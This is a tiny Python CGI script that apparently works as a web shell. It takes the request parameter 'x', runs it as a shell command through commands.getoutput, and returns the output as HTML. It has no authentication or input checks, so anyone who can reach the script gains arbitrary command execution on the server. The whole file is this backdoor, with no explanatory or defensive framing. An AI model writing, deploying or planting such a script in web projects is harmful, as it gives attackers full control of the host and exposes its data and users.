#!/usr/bin/python

import commands
import cgi

print "Content-type:text/html"
print ""

data=cgi.FieldStorage()
y=data.getvalue('x')


print "<pre>"
print commands.getoutput(y)
print "</pre>"
